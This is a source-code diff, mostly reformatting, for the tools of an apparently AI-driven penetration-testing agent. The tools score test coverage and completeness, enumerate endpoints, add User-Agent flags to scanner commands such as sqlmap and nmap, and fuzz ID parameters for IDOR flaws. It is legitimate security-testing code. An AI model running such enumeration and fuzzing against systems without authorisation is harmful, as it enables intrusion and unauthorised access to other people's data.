+            vulnerable: number;
+            safe: number;
+            parameters: Set<string>;
+          }
+        > = {};
 
         for (const result of testResults) {
           parametersTested.add(result.parameter);
@@ -2319,7 +2584,7 @@ Use this when:
               total: 0,
               vulnerable: 0,
               safe: 0,
-              parameters: new Set()
+              parameters: new Set(),
             };
           }
 
@@ -2337,17 +2602,21 @@ Use this when:
         }
 
         // Format coverage summary
-        const coverageSummary = Object.entries(coverageByAttackType).map(([attackType, stats]) => ({
-          attackType,
-          testsPerformed: stats.total,
-          vulnerabilitiesFound: stats.vulnerable,
-          parametersTested: Array.from(stats.parameters),
-          parametersCount: stats.parameters.size
-        }));
+        const coverageSummary = Object.entries(coverageByAttackType).map(
+          ([attackType, stats]) => ({
+            attackType,
+            testsPerformed: stats.total,
+            vulnerabilitiesFound: stats.vulnerable,
+            parametersTested: Array.from(stats.parameters),
+            parametersCount: stats.parameters.size,
+          })
+        );
 
         // Identify gaps
         const allAttackTypes = Object.keys(ATTACK_KNOWLEDGE);
-        const untestedAttackTypes = allAttackTypes.filter(at => !attackTypesCovered.has(at));
+        const untestedAttackTypes = allAttackTypes.filter(
+          (at) => !attackTypesCovered.has(at)
+        );
 
         // Generate suggestions
         const suggestions = [];
@@ -2357,29 +2626,43 @@ Use this when:
 
           // Check if objective mentions specific attack types that weren't tested
           for (const attackType of untestedAttackTypes) {
-            const knowledge = ATTACK_KNOWLEDGE[attackType as keyof typeof ATTACK_KNOWLEDGE];
+            const knowledge =
+              ATTACK_KNOWLEDGE[attackType as keyof typeof ATTACK_KNOWLEDGE];
             // Skip methodology - it's not a testable attack type
-            if ('systematic_discovery' in knowledge) continue;
+            if ("systematic_discovery" in knowledge) continue;
 
-            if (objectiveLower.includes(attackType.replace('_', ' ')) ||
-                objectiveLower.includes(knowledge.name.toLowerCase())) {
-              suggestions.push(`⚠️ Objective mentions "${knowledge.name}" but no tests performed yet`);
+            if (
+              objectiveLower.includes(attackType.replace("_", " ")) ||
+              objectiveLower.includes(knowledge.name.toLowerCase())
+            ) {
+              suggestions.push(
+                `⚠️ Objective mentions "${knowledge.name}" but no tests performed yet`
+              );
             }
           }
         }
 
         // Suggest testing parameters with different attack types
-        if (parametersTested.size > 0 && attackTypesCovered.size < allAttackTypes.length) {
+        if (
+          parametersTested.size > 0 &&
+          attackTypesCovered.size < allAttackTypes.length
+        ) {
           const sampleParameter = Array.from(parametersTested)[0];
           const untestedForParam = untestedAttackTypes.slice(0, 3);
           if (untestedForParam.length > 0) {
-            suggestions.push(`Consider testing "${sampleParameter}" for: ${untestedForParam.join(', ')}`);
+            suggestions.push(
+              `Consider testing "${sampleParameter}" for: ${untestedForParam.join(
+                ", "
+              )}`
+            );
           }
         }
 
         // Suggest thoroughness improvements
         if (testResults.length < 5) {
-          suggestions.push("Coverage is low. Consider testing more parameters and attack types.");
+          suggestions.push(
+            "Coverage is low. Consider testing more parameters and attack types."
+          );
         }
 
         return {
@@ -2395,24 +2678,26 @@ Use this when:
           vulnerableCount: vulnerableTests.length,
           safeCount: safeTests.length,
           coverageByAttackType: coverageSummary,
-          vulnerabilities: vulnerableTests.map(v => ({
+          vulnerabilities: vulnerableTests.map((v) => ({
             parameter: v.parameter,
             endpoint: v.endpoint,
             attackType: v.attackType,
-            confidence: v.confidence
+            confidence: v.confidence,
           })),
-          suggestions: suggestions.length > 0 ? suggestions : ["Coverage looks good. Review findings and prepare report."],
-          message: `Analyzed ${testResults.length} tests across ${parametersTested.size} parameters and ${attackTypesCovered.size} attack types.`
+          suggestions:
+            suggestions.length > 0
+              ? suggestions
+              : ["Coverage looks good. Review findings and prepare report."],
+          message: `Analyzed ${testResults.length} tests across ${parametersTested.size} parameters and ${attackTypesCovered.size} attack types.`,
         };
-
       } catch (error: any) {
         return {
           success: false,
           error: error.message,
-          message: `Failed to analyze coverage: ${error.message}`
+          message: `Failed to analyze coverage: ${error.message}`,
         };
       }
-    }
+    },
   });
 }
 
@@ -2437,24 +2722,36 @@ This is the difference between amateur and professional pentesting.`,
 
     inputSchema: z.object({
       objective: z.string().describe("Original penetration testing objective"),
-      discoveryAttempts: z.number().describe("How many times did you try to discover new endpoints?"),
-      anomaliesInvestigated: z.array(z.string()).describe("List of anomalies (404/500/errors) you investigated"),
-      toolCallDescription: z.string().optional()
+      discoveryAttempts: z
+        .number()
+        .describe("How many times did you try to discover new endpoints?"),
+      anomaliesInvestigated: z
+        .array(z.string())
+        .describe("List of anomalies (404/500/errors) you investigated"),
+      toolCallDescription: z
+        .string()
+        .describe(
+          "A concise, human-readable description of what this tool call is doing (e.g., 'Validating pentest completeness')"
+        ),
     }),
 
-    execute: async ({ objective, discoveryAttempts, anomaliesInvestigated }) => {
+    execute: async ({
+      objective,
+      discoveryAttempts,
+      anomaliesInvestigated,
+    }) => {
       try {
         const coverageTool = createCheckTestingCoverageTool(session);
         const coverageResult: any = await (coverageTool.execute as any)({
           objective,
-          toolCallDescription: 'Checking coverage for validation'
+          toolCallDescription: "Checking test coverage for validation",
         });
 
         if (!coverageResult.success) {
           return {
             success: false,
             message: "Cannot validate completeness - coverage check failed",
-            error: coverageResult.error
+            error: coverageResult.error,
           };
         }
 
@@ -2463,9 +2760,13 @@ This is the difference between amateur and professional pentesting.`,
         const passes = [];
 
         if (discoveryAttempts < 3) {
-          issues.push(`⚠️ Only ${discoveryAttempts} discovery attempts - need at least 3 to ensure completeness`);
+          issues.push(
+            `⚠️ Only ${discoveryAttempts} discovery attempts - need at least 3 to ensure completeness`
+          );
         } else {
-          passes.push(`✓ Made ${discoveryAttempts} discovery attempts - likely found everything`);
+          passes.push(
+            `✓ Made ${discoveryAttempts} discovery attempts - likely found everything`
+          );
         }
 
         const totalTests = coverageResult.totalTests || 0;
@@ -2473,39 +2774,55 @@ This is the difference between amateur and professional pentesting.`,
         const endpointsCount = coverageResult.endpointsCount || 0;
 
         if (totalTests < 5) {
-          issues.push(`⚠️ Only ${totalTests} tests performed - likely insufficient coverage`);
+          issues.push(
+            `⚠️ Only ${totalTests} tests performed - likely insufficient coverage`
+          );
         } else {
-          passes.push(`✓ Performed ${totalTests} tests across ${parametersCount} parameters and ${endpointsCount} endpoints`);
+          passes.push(
+            `✓ Performed ${totalTests} tests across ${parametersCount} parameters and ${endpointsCount} endpoints`
+          );
         }
 
         // Check 3: Attack type diversity
         const attackTypesCount = coverageResult.attackTypesCount || 0;
         if (attackTypesCount < 3) {
-          warnings.push(`⚠️ Only tested ${attackTypesCount} attack types - consider broader coverage`);
+          warnings.push(
+            `⚠️ Only tested ${attackTypesCount} attack types - consider broader coverage`
+          );
         } else {
           passes.push(`✓ Tested ${attackTypesCount} different attack types`);
         }
 
         // Check 4: Anomaly investigation
         if (anomaliesInvestigated.length === 0) {
-          warnings.push("⚠️ No anomalies investigated - did you encounter no errors at all?");
+          warnings.push(
+            "⚠️ No anomalies investigated - did you encounter no errors at all?"
+          );
         } else {
-          passes.push(`✓ Investigated ${anomaliesInvestigated.length} anomalies/errors`);
+          passes.push(
+            `✓ Investigated ${anomaliesInvestigated.length} anomalies/errors`
+          );
         }
 
         // Check 5: Findings documented
         const vulnerableCount = coverageResult.vulnerableCount || 0;
         if (vulnerableCount === 0 && totalTests > 10) {
-          warnings.push("⚠️ No vulnerabilities found despite extensive testing - verify test payloads are working");
+          warnings.push(
+            "⚠️ No vulnerabilities found despite extensive testing - verify test payloads are working"
+          );
         } else if (vulnerableCount > 0) {
           passes.push(`✓ Found ${vulnerableCount} vulnerabilities`);
         }
 
         // Check 6: Objective alignment
         if (objective && coverageResult.suggestions) {
-          const hasObjectiveWarnings = coverageResult.suggestions.some((s: string) => s.includes('Objective mentions'));
+          const hasObjectiveWarnings = coverageResult.suggestions.some(
+            (s: string) => s.includes("Objective mentions")
+          );
           if (hasObjectiveWarnings) {
-            issues.push("⚠️ Objective mentions attack types that weren't tested - see coverage suggestions");
+            issues.push(
+              "⚠️ Objective mentions attack types that weren't tested - see coverage suggestions"
+            );
           } else {
             passes.push("✓ Testing aligns with objective");
           }
@@ -2514,7 +2831,9 @@ This is the difference between amateur and professional pentesting.`,
         // Calculate completeness score
         const totalChecks = 6;
         const passedChecks = passes.length;
-        const completenessScore = Math.round((passedChecks / totalChecks) * 100);
+        const completenessScore = Math.round(
+          (passedChecks / totalChecks) * 100
+        );
 
         // Determine if ready to report
         const isComplete = issues.length === 0 && completenessScore >= 70;
@@ -2531,12 +2850,13 @@ This is the difference between amateur and professional pentesting.`,
           recommendation: isReady
             ? "✅ Assessment is complete and thorough. Ready to generate_report."
             : isComplete
-              ? "⚠️ Assessment is acceptable but could be more thorough. Consider addressing warnings before generate_report."
-              : "❌ Assessment is incomplete. Address issues before generate_report.",
-          nextActions: issues.length > 0
-            ? issues.map(issue => issue.replace('⚠️ ', 'TODO: '))
-            : warnings.length > 0
-              ? warnings.map(warn => warn.replace('⚠️ ', 'Consider: '))
+            ? "⚠️ Assessment is acceptable but could be more thorough. Consider addressing warnings before generate_report."
+            : "❌ Assessment is incomplete. Address issues before generate_report.",
+          nextActions:
+            issues.length > 0
+              ? issues.map((issue) => issue.replace("⚠️ ", "TODO: "))
+              : warnings.length > 0
+              ? warnings.map((warn) => warn.replace("⚠️ ", "Consider: "))
               : ["Generate final report"],
           coverageDetails: {
             totalTests,
@@ -2544,18 +2864,17 @@ This is the difference between amateur and professional pentesting.`,
             endpointsCount,
             attackTypesCount,
             vulnerableCount,
-            safeCount: coverageResult.safeCount || 0
-          }
+            safeCount: coverageResult.safeCount || 0,
+          },
         };
-
       } catch (error: any) {
         return {
           success: false,
           error: error.message,
-          message: `Validation failed: ${error.message}`
+          message: `Validation failed: ${error.message}`,
         };
       }
-    }
+    },
   });
 }
 
@@ -2578,38 +2897,53 @@ This tool is faster than manual curl loops and automatically records results.`,
 
     inputSchema: z.object({
       baseUrl: z.string().describe("Base URL (e.g., http://target.com)"),
-      pattern: z.string().describe("Pattern with {n} placeholder (e.g., /xss{n}, /api/v{n})"),
-      range: z.object({
-        min: z.number().default(1),
-        max: z.number().default(100)
-      }).describe("Range to enumerate"),
-      methods: z.array(z.enum(['GET', 'POST', 'PUT', 'DELETE', 'OPTIONS'])).default(['GET']).describe("HTTP methods to test"),
-      toolCallDescription: z.string().optional()
+      pattern: z
+        .string()
+        .describe("Pattern with {n} placeholder (e.g., /xss{n}, /api/v{n})"),
+      range: z
+        .object({
+          min: z.number().default(1),
+          max: z.number().default(100),
+        })
+        .describe("Range to enumerate"),
+      methods: z
+        .array(z.enum(["GET", "POST", "PUT", "DELETE", "OPTIONS"]))
+        .default(["GET"])
+        .describe("HTTP methods to test"),
+      toolCallDescription: z
+        .string()
+        .describe(
+          "A concise, human-readable description of what this tool call is doing (e.g., 'Enumerating API endpoints')"
+        ),
     }),
 
     execute: async ({ baseUrl, pattern, range, methods }) => {
       const discovered = [];
 
-      console.log(`\n[*] Enumerating ${baseUrl}${pattern} from ${range.min} to ${range.max}...`);
+      console.log(
+        `\n[*] Enumerating ${baseUrl}${pattern} from ${range.min} to ${range.max}...`
+      );
 
       // Generate bash script for enumeration
       for (let i = range.min; i <= range.max; i++) {
-        const endpoint = `${baseUrl}${pattern.replace('{n}', i.toString())}`;
+        const endpoint = `${baseUrl}${pattern.replace("{n}", i.toString())}`;
 
         for (const method of methods) {
           try {
             const response = await fetch(endpoint, {
               method,
-              redirect: 'manual'
+              redirect: "manual",
             });
 
             if (response.status !== 404) {
               discovered.push({
                 endpoint,
                 method,
-                status: response.status
+                status: response.status,
               });
-              console.log(`  Found: ${endpoint} [${method}] → HTTP ${response.status}`);
+              console.log(
+                `  Found: ${endpoint} [${method}] → HTTP ${response.status}`
+              );
             }
           } catch (error) {
             // Network errors, ignore
@@ -2620,9 +2954,13 @@ This tool is faster than manual curl loops and automatically records results.`,
       // Record discovery in scratchpad
       const note = `Endpoint Enumeration Results for ${pattern}:
 Found ${discovered.length} endpoints:
-${discovered.map(d => `- ${d.endpoint} [${d.method}] → HTTP ${d.status}`).join('\n')}
+${discovered
+  .map((d) => `- ${d.endpoint} [${d.method}] → HTTP ${d.status}`)
+  .join("\n")}
 
-Not found: ${(range.max - range.min + 1 - discovered.length)} endpoints returned 404`;
+Not found: ${
+        range.max - range.min + 1 - discovered.length
+      } endpoints returned 404`;
 
       // Record in scratchpad directly
       try {
@@ -2637,7 +2975,7 @@ Not found: ${(range.max - range.min + 1 - discovered.length)} endpoints returned
           writeFileSync(scratchpadFile, header + entry);
         }
       } catch (err) {
-        console.error('Failed to record to scratchpad:', err);
+        console.error("Failed to record to scratchpad:", err);
       }
 
       return {
@@ -2645,85 +2983,128 @@ Not found: ${(range.max - range.min + 1 - discovered.length)} endpoints returned
         discovered,
         total: range.max - range.min + 1,
         foundCount: discovered.length,
-        notFoundCount: (range.max - range.min + 1) - discovered.length,
-        message: `Found ${discovered.length}/${range.max - range.min + 1} endpoints`,
-        nextAction: discovered.length > 0
-          ? `Test each discovered endpoint for vulnerabilities`
-          : `Pattern ${pattern} not found - try different pattern`
+        notFoundCount: range.max - range.min + 1 - discovered.length,
+        message: `Found ${discovered.length}/${
+          range.max - range.min + 1
+        } endpoints`,
+        nextAction:
+          discovered.length > 0
+            ? `Test each discovered endpoint for vulnerabilities`
+            : `Pattern ${pattern} not found - try different pattern`,
       };
-    }
+    },
   });
 }
 
 /**
  * Wraps commands with User-Agent headers for common pentesting tools
  */
-function wrapCommandWithHeaders(command: string, headers: Record<string, string>): string {
-  const userAgent = headers['User-Agent'];
+function wrapCommandWithHeaders(
+  command: string,
+  headers: Record<string, string>
+): string {
+  const userAgent = headers["User-Agent"];
   if (!userAgent) return command;
 
   // Apply wrappers (defensive - won't break if pattern doesn't match)
   let wrapped = command;
 
   // curl - add User-Agent if not already present
-  if (command.includes('curl') && !command.includes('User-Agent') && !command.includes('-A')) {
+  if (
+    command.includes("curl") &&
+    !command.includes("User-Agent") &&
+    !command.includes("-A")
+  ) {
     // Use global replace to handle multiple curl commands in one line
     wrapped = wrapped.replace(/\bcurl(\s+)/g, `curl -A "${userAgent}" $1`);
   }
 
   // nikto - add User-Agent if not already present
-  if (command.includes('nikto') && !command.includes('-useragent')) {
+  if (command.includes("nikto") && !command.includes("-useragent")) {
     wrapped = wrapped.replace(/\bnikto\s+/, `nikto -useragent "${userAgent}" `);
   }
 
   // nmap - add User-Agent for HTTP scripts only
-  if (command.includes('nmap') && command.includes('--script') &&
-      /--script[= ](.*?http.*?)/.test(command) && !command.includes('http.useragent')) {
-    if (command.includes('--script-args')) {
-      wrapped = wrapped.replace(/--script-args\s+([^\s]+)/, `--script-args $1,http.useragent="${userAgent}"`);
+  if (
+    command.includes("nmap") &&
+    command.includes("--script") &&
+    /--script[= ](.*?http.*?)/.test(command) &&
+    !command.includes("http.useragent")
+  ) {
+    if (command.includes("--script-args")) {
+      wrapped = wrapped.replace(
+        /--script-args\s+([^\s]+)/,
+        `--script-args $1,http.useragent="${userAgent}"`
+      );
     } else {
       wrapped = `${wrapped} --script-args http.useragent="${userAgent}"`;
     }
   }
 
   // gobuster - add User-Agent if not already present
-  if (command.includes('gobuster') && !command.includes('-a ') && !command.includes('--useragent')) {
+  if (
+    command.includes("gobuster") &&
+    !command.includes("-a ") &&
+    !command.includes("--useragent")
+  ) {
     wrapped = wrapped.replace(/\bgobuster\s+/, `gobuster -a "${userAgent}" `);
   }
 
   // ffuf - add User-Agent if not already present
-  if (command.includes('ffuf') && !command.includes('User-Agent:')) {
-    wrapped = wrapped.replace(/\bffuf\s+/, `ffuf -H "User-Agent: ${userAgent}" `);
+  if (command.includes("ffuf") && !command.includes("User-Agent:")) {
+    wrapped = wrapped.replace(
+      /\bffuf\s+/,
+      `ffuf -H "User-Agent: ${userAgent}" `
+    );
   }
 
   // sqlmap - add User-Agent if not already present
-  if (command.includes('sqlmap') && !command.includes('--user-agent')) {
-    wrapped = wrapped.replace(/\bsqlmap\s+/, `sqlmap --user-agent="${userAgent}" `);
+  if (command.includes("sqlmap") && !command.includes("--user-agent")) {
+    wrapped = wrapped.replace(
+      /\bsqlmap\s+/,
+      `sqlmap --user-agent="${userAgent}" `
+    );
   }
 
   // wfuzz - add User-Agent if not already present
-  if (command.includes('wfuzz') && !command.includes('-H') && !command.includes('User-Agent')) {
-    wrapped = wrapped.replace(/\bwfuzz\s+/, `wfuzz -H "User-Agent: ${userAgent}" `);
+  if (
+    command.includes("wfuzz") &&
+    !command.includes("-H") &&
+    !command.includes("User-Agent")
+  ) {
+    wrapped = wrapped.replace(
+      /\bwfuzz\s+/,
+      `wfuzz -H "User-Agent: ${userAgent}" `
+    );
   }
 
   // dirb - add User-Agent if not already present
-  if (command.includes('dirb') && !command.includes('-a')) {
+  if (command.includes("dirb") && !command.includes("-a")) {
     wrapped = wrapped.replace(/\bdirb\s+/, `dirb -a "${userAgent}" `);
   }
 
   // wpscan - add User-Agent if not already present
-  if (command.includes('wpscan') && !command.includes('--user-agent')) {
-    wrapped = wrapped.replace(/\bwpscan\s+/, `wpscan --user-agent "${userAgent}" `);
+  if (command.includes("wpscan") && !command.includes("--user-agent")) {
+    wrapped = wrapped.replace(
+      /\bwpscan\s+/,
+      `wpscan --user-agent "${userAgent}" `
+    );
   }
 
   // nuclei - add User-Agent if not already present
-  if (command.includes('nuclei') && !command.includes('-H')) {
-    wrapped = wrapped.replace(/\bnuclei\s+/, `nuclei -H "User-Agent: ${userAgent}" `);
+  if (command.includes("nuclei") && !command.includes("-H")) {
+    wrapped = wrapped.replace(
+      /\bnuclei\s+/,
+      `nuclei -H "User-Agent: ${userAgent}" `
+    );
   }
 
   // httpx - add User-Agent if not already present
-  if (command.includes('httpx') && !command.includes('-H')) {
-    wrapped = wrapped.replace(/\bhttpx\s+/, `httpx -H "User-Agent: ${userAgent}" `);
+  if (command.includes("httpx") && !command.includes("-H")) {
+    wrapped = wrapped.replace(
+      /\bhttpx\s+/,
+      `httpx -H "User-Agent: ${userAgent}" `
+    );
   }
 
   return wrapped;
@@ -2744,30 +3125,56 @@ export function createPentestTools(
   // Get offensive headers from session config
   const offensiveHeaders = Session.getOffensiveHeaders(session);
 
-
   const fuzzEndpoint = tool({
     name: "fuzz_endpoint",
-    description: "Fuzz an endpoint with values between a given range to test for IDOR vulnerabilities. Only try to fuzz at most 50 values with each call of this tool.",
+    description:
+      "Fuzz an endpoint with values between a given range to test for IDOR vulnerabilities. Only try to fuzz at most 50 values with each call of this tool.",
     inputSchema: z.object({
-      url: z.string().describe("The base url/endpoint to make fuzzing requests against. Wrap dyanmic parameters in {}, e.g. {userId}."),
-      parameter: z.string().describe("The paramter value to replace when fuzzing"),
-      headers: z.record(z.string(), z.string()).describe("Headers to use in the request e.g. cookies").optional(),
+      url: z
+        .string()
+        .describe(
+          "The base url/endpoint to make fuzzing requests against. Wrap dyanmic parameters in {}, e.g. {userId}."
+        ),
+      parameter: z
+        .string()
+        .describe("The paramter value to replace when fuzzing"),
+      headers: z
+        .record(z.string(), z.string())
+        .describe("Headers to use in the request e.g. cookies")
+        .optional(),
       method: z.enum(["GET", "POST"]).describe("The request method to use"),
-      startNumber: z.number().describe("The start of the range of values to fuzz"),
-      endNumber: z.number().describe("The end of the range of values to fuzz")
+      startNumber: z
+        .number()
+        .describe("The start of the range of values to fuzz"),
+      endNumber: z.number().describe("The end of the range of values to fuzz"),
+      toolCallDescription: z
+        .string()
+        .describe(
+          "A concise, human-readable description of what this tool call is doing (e.g., 'Fuzzing user IDs for IDOR vulnerability')"
+        ),
     }),
-    execute: async ({ url, startNumber, endNumber, parameter, method, headers }) => {
-      const length = Math.floor((endNumber - startNumber)) + 1;
+    execute: async ({
+      url,
+      startNumber,
+      endNumber,
+      parameter,
+      method,
+      headers,
+    }) => {
+      const length = Math.floor(endNumber - startNumber) + 1;
       const ids = Array.from({ length }, (_, i) => startNumber + i);
-      
+
       const fuzz = async (value: number) => {
-        const result = await fetch(url.replace(`{${parameter}}`, value.toLocaleString()), { 
-          method: method,
-          headers: {...offensiveHeaders, ...headers}
-         });
-         const body = await result.text();
-         return body;
-      }
+        const result = await fetch(
+          url.replace(`{${parameter}}`, value.toLocaleString()),
+          {
+            method: method,
+            headers: { ...offensiveHeaders, ...headers },
+          }
+        );
+        const body = await result.text();
+        return body;
+      };
 
       const limit = pLimit(20);
 
@@ -2776,9 +3183,12 @@ export function createPentestTools(
       const results = await Promise.allSettled(input);
 
       // TODO: probably a better way to do this
-      return results.filter(r => r.status === "fulfilled").map(r => r.value).slice(0, 50);
-    }
-  })
+      return results
+        .filter((r) => r.status === "fulfilled")
+        .map((r) => r.value)
+        .slice(0, 50);
+    },
+  });
 
   // Get rate limiter from session (initialized eagerly in createSession)
   const rateLimiter = session._rateLimiter;
@@ -2896,7 +3306,15 @@ COMMON TESTING PATTERNS:
 - Look for admin panels (/admin, /administrator, /wp-admin)
 - Test for backup files (.bak, .old, ~, .swp)`,
     inputSchema: HttpRequestInput,
-    execute: async ({ url, method, headers, body, followRedirects, timeout, toolCallDescription }) => {
+    execute: async ({
+      url,
+      method,
+      headers,
+      body,
+      followRedirects,
+      timeout,
+      toolCallDescription,
+    }) => {
       try {
         // Apply rate limiting before HTTP request
         if (rateLimiter) {
@@ -2921,8 +3339,8 @@ COMMON TESTING PATTERNS:
         const response = await fetch(url, {
           method,
           headers: {
-            ...(offensiveHeaders || {}),  // Custom headers from session config
-            ...(headers || {}),            // User headers can override
+            ...(offensiveHeaders || {}), // Custom headers from session config
+            ...(headers || {}), // User headers can override
           },
           body: body || undefined,
           redirect: followRedirects ? "follow" : "manual",
@@ -2977,7 +3395,11 @@ COMMON TESTING PATTERNS:
     http_request: httpRequest,
     document_finding: createDocumentFindingTool(session),
     record_test_result: createRecordTestResultTool(session),
-    test_parameter: createSmartTestTool(session, model || 'claude-sonnet-4-20250514', onTokenUsage),
+    test_parameter: createSmartTestTool(
+      session,
+      model || "claude-sonnet-4-20250514",
+      onTokenUsage
+    ),
     check_testing_coverage: createCheckTestingCoverageTool(session),
     validate_completeness: createValidateCompletenessTool(session),
     enumerate_endpoints: createEnumerateEndpointsTool(session),
